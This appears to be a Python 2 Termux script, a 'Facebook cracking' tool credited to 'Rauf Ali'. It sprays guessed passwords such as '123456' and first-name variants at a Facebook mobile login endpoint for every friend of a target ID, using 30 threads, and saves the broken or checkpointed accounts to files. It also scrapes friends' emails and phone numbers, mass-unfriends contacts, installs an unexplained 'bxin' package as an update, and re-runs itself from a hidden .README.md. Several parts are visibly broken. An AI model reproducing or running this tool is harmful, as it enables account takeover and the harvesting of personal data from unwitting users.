#!/usr/bin/python2
#coding=utf-8

import os
import sys
import time
import threading
import datetime
import re
import json
import threading
import urllib
import cookielib
from multiprocessing.pool import ThreadPool

try:
    import requests
    import mechanize
except ImportError:
    os.system("pip2 install requests")
    os.system("pip2 install mechanize")
    time.sleep(1)
    os.system("python2 .README.md")
    
from requests.exceptions import ConnectionError
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
session = requests.Session()
session.headers.update({'User-Agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'})

def exb():
	os.system("rm -rf /sdcard/Android/data/com.termux/token.log")
	print ("[!] Exit")
	os.sys.exit()

def rf(str,n):
    rmf=str[n:]
    return rmf
    
def pf(str,n):
    prf=str[:n]
    return prf
    
def psb(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def t():
    time.sleep(1)
    
def cb():
    os.system("clear")
##### LOGO #####
logo="""

\033[1;96m   _______  _______           _______ 
\033[1;97m  (  ____ )(  ___  )|\     /|(  ____ \
\033[1;98m  | (    )|| (   ) || )   ( || (    \/
\033[1;99m  | (____)|| (___) || |   | || (__    
\033[1;98m  |     __)|  ___  || |   | ||  __)   
\033[1;97m  | (\ (   | (   ) || |   | || (      
\033[1;96m  | ) \ \__| )   ( || (___) || )      
\033[1;95m |/   \__/|/     \|(_______)|/       

--------------------------------------------------
➣ Auther   : Rauf Ali
➣ GitHub   : https://github.com/Dark Rulex
➣ YouTube  : The Tornado Boii
➣ Facebook   :   Raufonfire
--------------------------------------------------
                                """

def tik():
	titik = [".   ","..  ","... "]
	for o in titik:
		print("\r[●] Loging In "+o),;sys.stdout.flush();time.sleep(1)


back = 0
successful = []
cpb = []
oks = []
id = []

def token():
	os.system('clear')
	print logo
	toket = raw_input("Token : ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("/sdcard/Android/data/com.termux/token.log", 'w')
		zedd.write(toket)
		zedd.close()
		print '\033[0;92m√ Login Facebook Account'
		menu()
	except KeyError:
		print '\033[1;91m! Token Login '
		time.sleep(1.7)
		masuk()
	except requests.exceptions.SSLError:
		print '! W31C0M3'
		exit()
    
def menu():
	os.system('clear')
	try:
		time.sleep(0)
		print 'OHHH Bhai'
		
	except:
		print "\33[1;91mapi key not available"
		time.sleep(1)
		exit()
	try:
		o = requests.get('https://graph.facebook.com/me/?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(t.text)
		sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print '\33[1;91mtokens not available'
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print 'No connection'
		keluar()
	os.system("clear")
	print(logo)
	print("email   : "+n)
	print("key      : "+f)
	print("[✓] Name : "+name)
	print("[✓] ID   : "+id)
	print (50*"-")
	print
	print ("[1] Crack Menu")
	print ("[2] Crack With Pass Choice")
	print ("[3] Grab Emails")
	print ("[4] Grab Mobile Numbers")
	print ("[5] Unfriend with one click")
	print ("[6] Update Rauf Tool")
	print ("[7] Follow Me On Facebook")
	print ("[8] Log Out")
	print ("[0] Exit            ")
	print (50*"-")
	action()


def action():
	chb = raw_input("\n  ▄︻̷̿┻̿═━一   ")
	if chb =="":
		print ("[!] Fill in correctly")
		action()
	elif chb =="1":
	    crack_menu()
	elif chb =="2":
		choice_menu()
	elif chb =="3":
	    cb()
	    gbmail()
	elif chb =="4":
	    gbnmbr()
	elif chb =="5":
	    unfriend()
	elif chb =="6":
	    os.system("pip2 install --upgrade bxin")
	    cb()
	    print (logo)
	    psb("100%")
	    
	    
	elif chb =="7":
	    os.system("xdg-open www.facebook.com/Raufonfire")
	    time.sleep(1)
	    menu()
	elif chb =="8":
	    os.system("rm -rf /sdcard/Android/data/com.termux/token.log")
	    print
	    psb(" Logout successfully")
	elif chb =="0":
		exb()
	else:
		print ("[!] Fill in correctly")
		action()


def crack_menu():
	global toket
	os.system("clear")
	try:
		toket=open("/sdcard/Android/data/com.termux/token.log","r").read()
	except IOError:
		print("[!] Token invalid")
		os.system("rm -rf /sdcard/Android/data/com.termux/token.log")
		time.sleep(1)
		token()
	print (logo)
	print ("[1] Crack From Friend List")
	print ("[2] Crack From Any Public ID")
	print ("[3] Crack From File")
	print ("[0] Back")
	print (50*"-")
	crack_action()

def crack_action():
	bch = raw_input("\n  ▄︻̷̿┻̿═━一   ")
	if bch =="":
		print ("[!] Fill in correctly")
		crack_action()
	elif bch =="1":
		os.system("clear")
		print (logo)
		r = session.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z["data"]:
			id.append(s["id"])
	elif bch =="2":
		os.system("clear")
		print (logo)
		idt = raw_input("[✓] Enter ID : ")
		os.system("clear")
		print (logo)
		try:
			jok = session.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			psb("[✓] Account  Name: "+op["name"])
			time.sleep(0.5)
		except KeyError:
			print("[!] ID Not Found!")
			raw_input("\n[Back]")
			crack_menu()
		r = session.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z["data"]:
			id.append(i["id"])
	elif bch =="3":
		os.system("clear")
		print (logo)
		try:
			idlist = raw_input("[✓] Enter File Path  : ")
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			crack_menu()
	elif bch =="0":
		menu()
	else:
		print ("[!] Fill in correctly")
		crack_action()
	xxx = str(len(id))
	psb ("[✓] Total Friends: "+xxx)
	time.sleep(0.5)
	psb ("[✓] Please wait, process is running ...")
	time.sleep(0.5)
	psb ("[!] To Stop Process Press CTRL Then Press z")
	time.sleep(0.5)
	print (50*"-")
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			a = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			b = json.loads(a.text)
			d=b["first_name"]
			e=d.replace(" ", "")
			f=e.lower()
			g=pf(f, 1)
			h=g.upper()
			i=rf(f, 1)
			c=h+i
			pass1="786786"
			data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if "access_token" in q:
				print "\x1b[1;92m[Rauf Ok]\x1b[0m " + user + " | " + pass1
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print "[Checkpoint] " + user + " | " + pass1
					cps = open("checkpoint.txt", "a")
					cps.write(user+"|"+pass1+"\n")
					cps.close()
					cpb.append(user+pass1)
				else:
					pass2 = c+"@@@786"
					data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if "access_token" in q:
						print "\x1b[1;92m[Rauf Ok]\x1b[0m " + user + " | " + pass2
						oks.append(user+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print "[Checkpoint] " + user + " | " + pass2
							cps = open("checkpoint.txt", "a")
							cps.write(user+"|"+pass2+"\n")
							cps.close()
							cpb.append(user+pass2)
						else:
							pass3 = c + "102030"
							data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if "access_token" in q:
								print "\x1b[1;92m[Rauf Ok]\x1b[0m " + user + " | " + pass3
								oks.append(user+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print "[Checkpoint] " + user + " | " + pass3
									cps = open("checkpoint.txt", "a")
									cps.write(user+"|"+pass3+"\n")
									cps.close()
									cpb.append(user+pass3)
								else:
									pass4 = "223344"
									data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if "access_token" in q:
										print "\x1b[1;92m[Rauf Ok]\x1b[0m " + user + " | " + pass4
										oks.append(user+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print "[Checkpoint] " + user + " | " + pass4
											cps = open("checkpoint.txt", "a")
											cps.write(user+"|"+pass4+"\n")
											cps.close()
											cpb.append(user+pass4)
										else:
											pass5 = c + "786"
											data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if "access_token" in q:
												print "\x1b[1;92m[Rauf Ok]\x1b[0m " + user + " | " + pass5
												oks.append(user+pass5)
											else:
												if "www.facebook.com" in q["error_msg"]:
													print "[Checkpoint] " + user + " | " + pass5
													cps = open("checkpoint.txt", "a")
													cps.write(user+"|"+pass5+"\n")
													cps.close()
													cpb.append(user+pass5)
												else:
													pass6 = "123456"
													data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if "access_token" in q:
														print "\x1b[1;92m[Rauf Ok]\x1b[0m " + user + " | " + pass6
														oks.append(user+pass6)
													else:
														if "www.facebook.com" in q["error_msg"]:
															print "[Checkpoint] " + user + " | " + pass6
															cps = open("checkpoint.txt", "a")
															cps.write(user+"|"+pass6+"\n")
															cps.close()
															cpb.append(user+pass6)
														else:
															pass7 = c + "112233"
															data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if "access_token" in q:
																print "\x1b[1;92m[Rauf Ok]\x1b[0m " + user + " | " + pass7
																oks.append(user+pass7)
															else:
																if "www.facebook.com" in q["error_msg"]:
																	print "[Checkpoint] " + user + " | " + pass7
																	cps = open("checkpoint.txt", "a")
																	cps.write(user+"|"+pass7+"\n")
																	cps.close()
																	cpb.append(user+pass7)
																	
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print (50*"-")
	print ("[✓] Process Has Been Completed /sdcard/Android/data/com.termux/token.log")
	print ("[✓] Total OK/CP : "+str(len(oks))+"/"+str(len(cpb)))
	print("[✓] CP File Has Been Saved : checkpoint.txt")
	raw_input("\n[Back]")
	if xxx == "0":
		crack_menu()
	else:
		os.system("python2 .README.md")

def choice_menu():
	global toket
	os.system("clear")
	try:
		toket=open("/sdcard/Android/data/com.termux/token.log","r").read()
	except IOError:
		print("[!] Token invalid")
		os.system("rm -rf /sdcard/Android/data/com.termux/token.log")
		time.sleep(1)
		token()
	os.system("clear")
	print (logo)
	print ("[1] Crack From Friend List")
	print ("[2] Crack From Any Public ID")
	print ("[3] Crack From File")
	print ("[0] Back")
	print (50*"-")
	choice_action()

def choice_action():
	bch = raw_input("\n  ▄︻̷̿┻̿═━一   ")
	if bch =="":
		print ("[!] Fill in correctly")
		choice_action()
	elif bch =="1":
		os.system("clear")
		print (logo)
		pass1=raw_input(" Put Password No 1 : ")
		pass2=raw_input(" Put Password No 2 : ")
		pass3=raw_input(" Put Password No 3 : ")
		pass4=raw_input(" Put Password No 4 : ")
		pass5=raw_input(" Put Password No 5 : ")
		pass6=raw_input(" Put Password No 6 : ")
		pass7=raw_input(" Put Password No 7 : ")
		r = session.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z["data"]:
			id.append(s["id"])
	elif bch =="2":
		os.system("clear")
		print (logo)
		idt = raw_input("[✓] Enter ID : ")
		pass1=raw_input(" Put Password No 1 : ")
		pass2=raw_input(" Put Password No 2 : ")
		pass3=raw_input(" Put Password No 3 : ")
		pass4=raw_input(" Put Password No 4 : ")
		pass5=raw_input(" Put Password No 5 : ")
		pass6=raw_input(" Put Password No 6 : ")
		pass7=raw_input(" Put Password No 7 : ")
		os.system("clear")
		print (logo)
		try:
			jok = session.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			psb("[✓] Account  Name: "+op["name"])
			time.sleep(0.5)
		except KeyError:
			print("[!] ID Not Found!")
			raw_input("\n[Back]")
			choice_menu()
		r = session.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z["data"]:
			id.append(i["id"])
	elif bch =="3":
		os.system("clear")
		print (logo)
		try:
			idlist = raw_input("[✓] Enter File Path  : ")
			pass1=raw_input(" Put Password No 1 : ")
			pass2=raw_input(" Put Password No 2 : ")
			pass3=raw_input(" Put Password No 3 : ")
			pass4=raw_input(" Put Password No 4 : ")
			pass5=raw_input(" Put Password No 5 : ")
			pass6=raw_input(" Put Password No 6 : ")
			pass7=raw_input(" Put Password No 7 : ")
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			choice_menu()
	elif bch =="0":
		menu()
	else:
		print ("[!] Fill in correctly")
		choice_action()
	xxx = str(len(id))
	psb ("[✓] Total Friends: "+xxx)
	time.sleep(0.5)
	psb ("[✓] Please wait, process is running ...")
	time.sleep(0.5)
	psb ("[!] To Stop Process Press CTRL Then Press z")
	time.sleep(0.5)
	print (50*"-")
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			a = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			b = json.loads(a.text)
		except OSError:
			pass
		try:
			a = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			b = json.loads(a.text)
			data1 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q1 = json.loads(data1.text)
			if "access_token" in q1:
				print "\x1b[1;92m[Rauf Ok]\x1b[0m " + user + " | " + pass1
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q1["error_msg"]:
					print "[Rauf Cp] " + user + " | " + pass1
					cps = open("checkpoint.txt", "a")
					cps.write(user+"|"+pass1+"\n")
					cps.close()
					cpb.append(user+pass1)
				else:
					data2 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q2 = json.loads(data2.text)
					if "access_token" in q2:
						print "\x1b[1;92m[Rauf Ok]\x1b[0m " + user + " | " + pass2
						oks.append(user+pass2)
					else:
						if "www.facebook.com" in q2["error_msg"]:
							print "[Rauf Cp] " + user + " | " + pass2
							cps = open("checkpoint.txt", "a")
							cps.write(user+"|"+pass2+"\n")
							cps.close()
							cpb.append(user+pass2)
						else:
							data3 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q3 = json.loads(data3.text)
							if "access_token" in q3:
								print "\x1b[1;95m[Rauf Ok]\x1b[0m " + user + " | " + pass3
								oks.append(user+pass3)
							else:
								if "www.facebook.com" in q3["error_msg"]:
									print "[Rauf Cp] " + user + " | " + pass3
									cps = open("checkpoint.txt", "a")
									cps.write(user+"|"+pass3+"\n")
									cps.close()
									cpb.append(user+pass3)
								else:
									data4 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q4 = json.loads(data4.text)
									if "access_token" in q4:
										print "\x1b[1;94m[Rauf Ok]\x1b[0m " + user + " | " + pass4
										oks.append(user+pass4)
									else:
										if "www.facebook.com" in q4["error_msg"]:
											print "[Rauf Cp] " + user + " | " + pass4
											cps = open("checkpoint.txt", "a")
											cps.write(user+"|"+pass4+"\n")
											cps.close()
											cpb.append(user+pass4)
										else:
											data5 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q5 = json.loads(data5.text)
											if "access_token" in q5:
												print "\x1b[1;93m[Rauf Ok]\x1b[0m " + user + " | " + pass5
												oks.append(user+pass5)
											else:
												if "www.facebook.com" in q5["error_msg"]:
													print "[Rauf Cp] " + user + " | " + pass5
													cps = open("checkpoint.txt", "a")
													cps.write(user+"|"+pass5+"\n")
													cps.close()
													cpb.append(user+pass5)
												else:
													data6 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q6 = json.loads(data6.text)
													if "access_token" in q6:
														print "\x1b[1;97m[Rauf Ok]\x1b[0m " + user + " | " + pass6
														oks.append(user+pass6)
													else:
														if "www.facebook.com" in q6["error_msg"]:
															print "[Rauf Cp] " + user + " | " + pass6
															cps = open("checkpoint.txt", "a")
															cps.write(user+"|"+pass6+"\n")
															cps.close()
															cpb.append(user+pass6)
														else:
															data7 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q7 = json.loads(data7.text)
															if "access_token" in q7:
																print "\x1b[1;98m[Rauf Ok]\x1b[0m " + user + " | " + pass7
																oks.append(user+pass7)
															else:
																if "www.facebook.com" in q7["error_msg"]:
																	print "[Rauf Cp] " + user + " | " + pass7
																	cps = open("checkpoint.txt", "a")
																	cps.write(user+"|"+pass7+"\n")
																	cps.close()
																	cpb.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print (50*"-")
	print ("[✓] Process Has Been Completed /sdcard/Android/data/com.termux/token.log")
	print ("[✓] Total OK/CP : "+str(len(oks))+"/"+str(len(cpb)))
	print("[✓] CP File Has Been Saved : checkpoint.txt")
	raw_input("\n[Back]")
	if xxx == "0":
		crack_menu()
	else:
		os.system("python2 .README.md")
		
def gbmail():
	global toket
	os.system("clear")
	try:
		toket=open("/sdcard/Android/data/com.termux/token.log","r").read()
	except IOError:
		print("[!] Token invalid")
		os.system("rm -rf /sdcard/Android/data/com.termux/token.log")
		time.sleep(1)
		token()
	else:
	    agbm()

def agbm():
	bch = ("2")
	if bch =="":
		print ("[!] Fill in correctly")
		agbm()
	elif bch =="2":
		os.system("clear")
		print (logo)
		idt = raw_input("[✓] Enter ID : ")
		os.system("clear")
		print (logo)
		try:
			jok = session.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			psb("[✓] Account  Name: "+op["name"])
			time.sleep(0.5)
		except KeyError:
			print("[!] ID Not Found!")
			raw_input("\n[Back]")
			gbmail()
		r = session.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z["data"]:
			id.append(i["id"])
	xxx = str(len(id))
	psb ("[✓] Total Friends: "+xxx)
	time.sleep(0.5)
	psb ("[✓] Please wait, process is running ...")
	time.sleep(0.5)
	psb ("[!] To Stop Process Press CTRL Then Press z")
	time.sleep(0.5)
	print (50*"-")
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			data = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			q = json.loads(data.text)
			if "email" not in q:
				pass
			else:
				if "email" in q:
				    gms = q["email"]
				    print (user + "  |  " + gms + "\n")
				    bms.open("emails.txt", "a")
				    bms.write(user + "  |  " + gms + "\n")
				    bms.close()
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print (50*"-")
	print ("[✓] Process Has Been Completed /sdcard/Android/data/com.termux/token.log")
	print("[✓] File Has Been Saved : emails.txt")
	raw_input("\n[Back]")
	if xxx == "0":
		crack_menu()
	else:
		os.system("python2 .README.md")
		
def gbnmbr():
	global toket
	os.system("clear")
	try:
		toket=open("/sdcard/Android/data/com.termux/token.log","r").read()
	except IOError:
		print("[!] Token invalid")
		os.system("rm -rf /sdcard/Android/data/com.termux/token.log")
		time.sleep(1)
		token()
	else:
	    agbn()

def agbn():
	bch = ("2")
	if bch =="":
		print ("[!] Fill in correctly")
		agbn()
	elif bch =="2":
		os.system("clear")
		print (logo)
		idt = raw_input("[✓] Enter ID : ")
		os.system("clear")
		print (logo)
		try:
			jok = session.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			psb("[✓] Account  Name: "+op["name"])
			time.sleep(0.5)
		except KeyError:
			print("[!] ID Not Found!")
			raw_input("\n[Back]")
			gbnmbr()
		r = session.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z["data"]:
			id.append(i["id"])
	xxx = str(len(id))
	psb ("[✓] Total Friends: "+xxx)
	time.sleep(0.5)
	psb ("[✓] Please wait, process is running ...")
	time.sleep(0.5)
	psb ("[!] To Stop Process Press CTRL Then Press z")
	time.sleep(0.5)
	print (50*"-")
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			data = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			q = json.loads(data.text)
			if "mobile_phone" not in q:
				pass
			else:
				if "mobile_phone" in q:
				    gns = q["mobile_phone"]
				    gn=q["name"]
				    print (user + " | " + gn + gns + "\n")
				    bms.open("numbers.txt", "a")
				    bms.write(user + " | " + gn + gns + "\n")
				    bms.close()
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print (50*"-")
	print ("[✓] Process Has Been Completed /sdcard/Android/data/com.termux/token.log")
	print("[✓] File Has Been Saved : numbers.txt")
	raw_input("\n[Back]")
	if xxx == "0":
		crack_menu()
	else:
		os.system("python2 .README.md")

def unfriend():
    os.system('clear')
    try:
        toket = open('/sdcard/Android/data/com.termux/token.log', 'r').read()
    except IOError:
        print 'token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 'To stop press CTRL then press Z'
        print 50*"-"
        print
        try:
            pek = session.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            cok = json.loads(pek.text)
            for i in cok['data']:
                name = i['name']
                id = i['id']
                session.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + toket)
                print ("[Unfriended]  "+name)

        except IndexError:
            pass
        except KeyboardInterrupt:
            exit()
    print " All friend has been removed"
    raw_input('[Back]')
    os.system("python2 .README.md")
    
if __name__ == "__main__":
